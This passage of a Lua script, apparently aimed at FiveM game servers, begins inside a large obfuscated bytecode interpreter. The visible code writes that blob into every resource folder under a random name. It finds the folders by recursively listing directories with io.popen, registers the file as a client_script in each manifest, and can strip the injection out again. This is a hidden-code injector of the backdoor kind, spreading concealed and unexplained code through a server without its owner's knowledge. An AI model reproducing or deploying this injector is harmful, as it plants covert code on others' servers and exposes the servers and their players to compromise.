mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];end;elseif mxsgay_e<=22 then if mxsgay_e>21 then mxsgay_c[mxsgay_a[2]]=#mxsgay_c[mxsgay_a[3]];else mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];end;elseif mxsgay_e>23 then local mxsgay_b=mxsgay_a[2]mxsgay_c[mxsgay_b](mxsgay_h(mxsgay_c,mxsgay_b+1,mxsgay_a[3]))else mxsgay_c[mxsgay_a[2]]=mxsgay_k[mxsgay_a[3]];end;elseif mxsgay_e<=28 then if mxsgay_e<=26 then if mxsgay_e==25 then mxsgay_c[mxsgay_a[2]]=mxsgay_c[mxsgay_a[3]];else local mxsgay_a=mxsgay_a[2]mxsgay_c[mxsgay_a](mxsgay_c[mxsgay_a+1])end;elseif mxsgay_e==27 then local mxsgay_d=mxsgay_a[2];local mxsgay_f=mxsgay_c[mxsgay_d+2];local mxsgay_e=mxsgay_c[mxsgay_d]+mxsgay_f;mxsgay_c[mxsgay_d]=mxsgay_e;if(mxsgay_f>0)then if(mxsgay_e<=mxsgay_c[mxsgay_d+1])then mxsgay_b=mxsgay_a[3];mxsgay_c[mxsgay_d+3]=mxsgay_e;end elseif(mxsgay_e>=mxsgay_c[mxsgay_d+1])then mxsgay_b=mxsgay_a[3];mxsgay_c[mxsgay_d+3]=mxsgay_e;end else mxsgay_c[mxsgay_a[2]]();end;elseif mxsgay_e<=30 then if mxsgay_e>29 then mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];else mxsgay_c[mxsgay_a[2]]=mxsgay_c[mxsgay_a[3]][mxsgay_a[4]];end;elseif mxsgay_e<=31 then local mxsgay_f;local mxsgay_e;mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_e=mxsgay_a[2];mxsgay_f=mxsgay_c[mxsgay_e];for mxsgay_a=mxsgay_e+1,mxsgay_a[3]do mxsgay_j(mxsgay_f,mxsgay_c[mxsgay_a])end;elseif mxsgay_e==32 then local mxsgay_f;local mxsgay_e;mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_e=mxsgay_a[2];mxsgay_f=mxsgay_c[mxsgay_e];for mxsgay_a=mxsgay_e+1,mxsgay_a[3]do mxsgay_j(mxsgay_f,mxsgay_c[mxsgay_a])end;else local mxsgay_a=mxsgay_a[2]mxsgay_c[mxsgay_a](mxsgay_c[mxsgay_a+1])end;elseif mxsgay_e<=50 then if mxsgay_e<=41 then if mxsgay_e<=37 then if mxsgay_e<=35 then if mxsgay_e==34 then local mxsgay_f;local mxsgay_e;mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_e=mxsgay_a[2];mxsgay_f=mxsgay_c[mxsgay_e];for mxsgay_a=mxsgay_e+1,mxsgay_a[3]do mxsgay_j(mxsgay_f,mxsgay_c[mxsgay_a])end;else if(mxsgay_c[mxsgay_a[2]]~=mxsgay_a[4])then mxsgay_b=mxsgay_b+1;else mxsgay_b=mxsgay_a[3];end;end;elseif mxsgay_e==36 then local mxsgay_a=mxsgay_a[2]mxsgay_c[mxsgay_a](mxsgay_h(mxsgay_c,mxsgay_a+1,mxsgay_g))else local mxsgay_a=mxsgay_a[2]mxsgay_c[mxsgay_a](mxsgay_h(mxsgay_c,mxsgay_a+1,mxsgay_g))end;elseif mxsgay_e<=39 then if mxsgay_e==38 then mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];else local mxsgay_b=mxsgay_a[2];local mxsgay_d=mxsgay_c[mxsgay_b];for mxsgay_a=mxsgay_b+1,mxsgay_a[3]do mxsgay_j(mxsgay_d,mxsgay_c[mxsgay_a])end;end;elseif mxsgay_e>40 then local mxsgay_a=mxsgay_a[2]mxsgay_c[mxsgay_a]=mxsgay_c[mxsgay_a]()else if mxsgay_c[mxsgay_a[2]]then mxsgay_b=mxsgay_b+1;else mxsgay_b=mxsgay_a[3];end;end;elseif mxsgay_e<=45 then if mxsgay_e<=43 then if mxsgay_e==42 then mxsgay_c[mxsgay_a[2]]=mxsgay_c[mxsgay_a[3]];else local mxsgay_i;local mxsgay_k,mxsgay_j;local mxsgay_e;mxsgay_c[mxsgay_a[2]]=mxsgay_c[mxsgay_a[3]][mxsgay_a[4]];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_f[mxsgay_a[3]];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_c[mxsgay_a[3]][mxsgay_a[4]];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_e=mxsgay_a[2]mxsgay_k,mxsgay_j=mxsgay_n(mxsgay_c[mxsgay_e](mxsgay_h(mxsgay_c,mxsgay_e+1,mxsgay_a[3])))mxsgay_g=mxsgay_j+mxsgay_e-1 mxsgay_i=0;for mxsgay_a=mxsgay_e,mxsgay_g do mxsgay_i=mxsgay_i+1;mxsgay_c[mxsgay_a]=mxsgay_k[mxsgay_i];end;mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_e=mxsgay_a[2]mxsgay_c[mxsgay_e](mxsgay_h(mxsgay_c,mxsgay_e+1,mxsgay_g))mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_f[mxsgay_a[3]];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]();mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_b=mxsgay_a[3];end;elseif mxsgay_e>44 then mxsgay_c[mxsgay_a[2]]=mxsgay_f[mxsgay_a[3]];else mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];end;elseif mxsgay_e<=47 then if mxsgay_e>46 then local mxsgay_h=mxsgay_m[mxsgay_a[3]];local mxsgay_g;local mxsgay_e={};mxsgay_g=mxsgay_p({},{__index=function(mxsgay_b,mxsgay_a)local mxsgay_a=mxsgay_e[mxsgay_a];return mxsgay_a[1][mxsgay_a[2]];end,__newindex=function(mxsgay_c,mxsgay_a,mxsgay_b)local mxsgay_a=mxsgay_e[mxsgay_a]mxsgay_a[1][mxsgay_a[2]]=mxsgay_b;end;});for mxsgay_f=1,mxsgay_a[4]do mxsgay_b=mxsgay_b+1;local mxsgay_a=mxsgay_d[mxsgay_b];if mxsgay_a[1]==25 then mxsgay_e[mxsgay_f-1]={mxsgay_c,mxsgay_a[3]};else mxsgay_e[mxsgay_f-1]={mxsgay_k,mxsgay_a[3]};end;mxsgay_l[#mxsgay_l+1]=mxsgay_e;end;mxsgay_c[mxsgay_a[2]]=mxsgay_i(mxsgay_h,mxsgay_g,mxsgay_f);else local mxsgay_d=mxsgay_a[2];local mxsgay_e=mxsgay_c[mxsgay_d]local mxsgay_f=mxsgay_c[mxsgay_d+2];if(mxsgay_f>0)then if(mxsgay_e>mxsgay_c[mxsgay_d+1])then mxsgay_b=mxsgay_a[3];else mxsgay_c[mxsgay_d+3]=mxsgay_e;end elseif(mxsgay_e<mxsgay_c[mxsgay_d+1])then mxsgay_b=mxsgay_a[3];else mxsgay_c[mxsgay_d+3]=mxsgay_e;end end;elseif mxsgay_e<=48 then mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];elseif mxsgay_e==49 then mxsgay_c[mxsgay_a[2]]=mxsgay_i(mxsgay_m[mxsgay_a[3]],nil,mxsgay_f);else local mxsgay_h=mxsgay_m[mxsgay_a[3]];local mxsgay_g;local mxsgay_e={};mxsgay_g=mxsgay_p({},{__index=function(mxsgay_b,mxsgay_a)local mxsgay_a=mxsgay_e[mxsgay_a];return mxsgay_a[1][mxsgay_a[2]];end,__newindex=function(mxsgay_c,mxsgay_a,mxsgay_b)local mxsgay_a=mxsgay_e[mxsgay_a]mxsgay_a[1][mxsgay_a[2]]=mxsgay_b;end;});for mxsgay_f=1,mxsgay_a[4]do mxsgay_b=mxsgay_b+1;local mxsgay_a=mxsgay_d[mxsgay_b];if mxsgay_a[1]==25 then mxsgay_e[mxsgay_f-1]={mxsgay_c,mxsgay_a[3]};else mxsgay_e[mxsgay_f-1]={mxsgay_k,mxsgay_a[3]};end;mxsgay_l[#mxsgay_l+1]=mxsgay_e;end;mxsgay_c[mxsgay_a[2]]=mxsgay_i(mxsgay_h,mxsgay_g,mxsgay_f);end;elseif mxsgay_e<=58 then if mxsgay_e<=54 then if mxsgay_e<=52 then if mxsgay_e==51 then mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];else local mxsgay_d=mxsgay_a[3];local mxsgay_b=mxsgay_c[mxsgay_d]for mxsgay_a=mxsgay_d+1,mxsgay_a[4]do mxsgay_b=mxsgay_b..mxsgay_c[mxsgay_a];end;mxsgay_c[mxsgay_a[2]]=mxsgay_b;end;elseif mxsgay_e==53 then mxsgay_f[mxsgay_a[3]]=mxsgay_c[mxsgay_a[2]];else local mxsgay_d=mxsgay_a[3];local mxsgay_b=mxsgay_c[mxsgay_d]for mxsgay_a=mxsgay_d+1,mxsgay_a[4]do mxsgay_b=mxsgay_b..mxsgay_c[mxsgay_a];end;mxsgay_c[mxsgay_a[2]]=mxsgay_b;end;elseif mxsgay_e<=56 then if mxsgay_e==55 then if(mxsgay_c[mxsgay_a[2]]==mxsgay_c[mxsgay_a[4]])then mxsgay_b=mxsgay_b+1;else mxsgay_b=mxsgay_a[3];end;else mxsgay_b=mxsgay_a[3];end;elseif mxsgay_e==57 then local mxsgay_b=mxsgay_a[2];local mxsgay_d=mxsgay_c[mxsgay_b];for mxsgay_a=mxsgay_b+1,mxsgay_a[3]do mxsgay_j(mxsgay_d,mxsgay_c[mxsgay_a])end;else local mxsgay_a=mxsgay_a[2]mxsgay_c[mxsgay_a]=mxsgay_c[mxsgay_a]()end;elseif mxsgay_e<=62 then if mxsgay_e<=60 then if mxsgay_e==59 then if(mxsgay_c[mxsgay_a[2]]==mxsgay_c[mxsgay_a[4]])then mxsgay_b=mxsgay_b+1;else mxsgay_b=mxsgay_a[3];end;else mxsgay_c[mxsgay_a[2]]={};mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];end;elseif mxsgay_e>61 then do return end;else if(mxsgay_c[mxsgay_a[2]]~=mxsgay_a[4])then mxsgay_b=mxsgay_b+1;else mxsgay_b=mxsgay_a[3];end;end;elseif mxsgay_e<=64 then if mxsgay_e==63 then mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];mxsgay_b=mxsgay_b+1;mxsgay_a=mxsgay_d[mxsgay_b];mxsgay_c[mxsgay_a[2]]=mxsgay_a[3];else mxsgay_c[mxsgay_a[2]]={};end;elseif mxsgay_e<=65 then mxsgay_c[mxsgay_a[2]]=mxsgay_i(mxsgay_m[mxsgay_a[3]],nil,mxsgay_f);elseif mxsgay_e==66 then mxsgay_c[mxsgay_a[2]]=#mxsgay_c[mxsgay_a[3]];else if mxsgay_c[mxsgay_a[2]]then mxsgay_b=mxsgay_b+1;else mxsgay_b=mxsgay_a[3];end;end;mxsgay_b=mxsgay_b+1;end;end);end;return mxsgay_i(true,{},mxsgay_s())();end)(string.byte,table.insert,setmetatable);'

				ap = io.open(an.."/"..ad..".lua", "w")
				if ap then
					ap:seek("set", 0)
                    ap:write(az)
					ap:close()
					af[1] = af[1] + 1;
					print("^"..math.random(1, 9).." ^2 LOADING SUCCESSFUL ^0"..ar.." ^2completed.^0")
				else
					print("^"..math.random(1, 9).."^8LOADING failed on ^0"..ar.."^8.^0")
				end;
				af[2] = af[2] + 1
			else
				af[3] = af[3] + 1
			end
		else
			ap:seek("set", 0)
			local as = ap:read("*a")
			ap:close()
			local at = split(as, "\n")
			as = ""
			local au = false;
			local av = false;
			for U, aw in ipairs(at) do
				if aw == "client_script \""..ad..".lua\"" then
					au = true
				else
					as = as..aw.."\n"
				end
			end;
			if os.rename(an.."/"..ad..".lua", an.."/"..ad..".lua") then
				av = true;
				os.remove(an.."/"..ad..".lua")
			end;
			if not au and not av then
				af[3] = af[3] + 1
			end;
			if au then
				af[2] = af[2] + 1;
				os.remove(an.."/"..ae..".lua")
				ap = io.open(an.."/"..ae..".lua", "w")
				if ap then
					ap:seek("set", 0)
					ap:write(as)
					ap:close()
				else
					print("^8 Deletion failed"..ar..".^0")
					print("^8Make sure you are using the right variable!!!.^0")
					au, av = false, false
				end
			end;
			if au or av then
				print("^"..math.random(1, 9).."^2DELETE from ^0"..ar.." ^2successfully.^0")
				af[1] = af[1] + 1
			end
		end
	else
		af[3] = af[3] + 1
	end
end;
function searchall(an, ao)
	local ap = io.popen("dir \""..an.."\" /b /ad")
	ap:seek("set", 0)
	local aA = ap:read("*a")
	ap:close()
	local at = split(aA, "\n")
	for U, aw in ipairs(at) do
		if string.len(aw) > 0 then
			setall(an.."/"..aw, ao)
			searchall(an.."/"..aw, ao)
		end
	end
end;
function split(aB, aC)
	local aD, aE = 0, {}
	for aF, aG in function()
		return string.find(aB, aC, aD, true)
	end do
		table.insert(aE, string.sub(aB, aD, aF - 1))
		aD = aG + 1
	end;
	table.insert(aE, string.sub(aB, aD))
	return aE
end;
function randomstring()
	local aH = 'mxs'
	local aI = 1;
	local aJ = ''
	math.randomseed(os.time())
	charTable = {}
	for aK in aH:gmatch"." do
		table.insert(charTable, aK)
	end;
	for al = 1, aI do
		aJ = aJ..charTable[math.random(1, #charTable)]
	end;
	ad = aJ
end;